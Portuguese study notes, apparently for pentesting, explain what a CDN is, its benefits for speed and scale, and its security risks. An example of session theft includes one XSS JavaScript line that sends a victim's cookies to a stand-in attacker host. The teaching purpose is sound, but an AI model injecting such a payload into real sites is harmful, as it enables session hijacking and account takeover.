## O que é CDN?

CDN significa **Content Delivery Network** (Rede de Distribuição de Conteúdo). É um **conjunto de servidores distribuídos geograficamente** que trabalham juntos para **entregar conteúdo web de forma rápida e eficiente** aos usuários.

---

## Como funciona?

Quando você acessa um site que usa CDN, o conteúdo estático (imagens, CSS, JS, vídeos, etc.) **não vem diretamente do servidor principal (origem)**, mas sim de **servidores CDN próximos da sua localização**.

### Exemplo:

- Você está no Brasil e acessa amazon.com.
    
- O conteúdo estático vem de um servidor CDN no Brasil ou América do Sul.
    
- Resultado: o site **carrega mais rápido**, mesmo sendo hospedado nos EUA.
    

---

## Benefícios do CDN

|Benefício|Explicação|
|---|---|
|**Velocidade**|Carrega o conteúdo mais próximo do usuário. Menos latência.|
|**Menos carga no servidor**|Reduz o número de requisições no servidor principal (origem).|
|**Alta disponibilidade**|Mesmo que um servidor caia, outro entra em ação.|
|**Escalabilidade**|Suporta grande volume de tráfego em datas como Black Friday ou lançamentos.|
|**Segurança**|Ajuda a mitigar ataques DDoS, esconder IP real do servidor de origem.|

---

## Como o CDN ajuda na **escala do sistema**?

Imagine que você tem um site com milhões de acessos simultâneos (ex: Netflix, Amazon, GloboPlay). Se tudo for processado por um único servidor, ele **sobrecarrega e cai**.

Com um CDN:

- O **tráfego é distribuído** por diversos pontos do mundo.
    
- Cada visitante acessa o conteúdo de um servidor **próximo a ele**.
    
- O servidor principal **fica responsável só pelo que é dinâmico**, como login ou banco de dados.
    

---

## CDN pode expor informações?

Sim, em casos de **configurações erradas** ou **vazamento de cookies/sessões**, o uso de CDN **não impede que um atacante intercepte ou roube sessões**. E isso é essencial para quem faz **pentest** entender.

### Exemplo de risco:

- O servidor entrega um **cookie de sessão** via CDN ou cabeçalho mal configurado.
    
- Se esse cookie **não for marcado como `HttpOnly` e `Secure`**, pode ser interceptado.
    
- Se o cookie for enviado a um domínio de CDN (ou malicioso), o atacante pode **roubar a sessão do usuário**.
    

---

## Exemplo prático (sessão roubada):

1. O servidor envia:
    
    ```
    Set-Cookie: sessionid=abc123; Path=/; Domain=.meusite.com
    ```
    
2. O atacante injeta um JS por XSS:
    
    ```javascript
    document.location = "https://meusite.attacker.com?cookie=" + document.cookie;
    ```
    
3. O cookie vai parar no servidor do atacante.
    
4. O atacante usa a sessão e **acessa a conta da vítima.**
    

---

## Ferramentas comuns de CDN

- **Cloudflare**
    
- **Akamai**
    
- **AWS CloudFront**
    
- **Google Cloud CDN**
    
- **Fastly**
    

---

## Dica de pentest

Durante o teste, identifique:

- Qual CDN está sendo usado (ferramentas como `Wappalyzer` ou `dig`).
    
- Se cookies são vazados via headers mal configurados.
    
- Se há dependência de **CDNs de terceiros** com JS potencialmente malicioso.
    
- Se o CDN está **expondo a origem** do servidor real (ex: DNS mal configurado).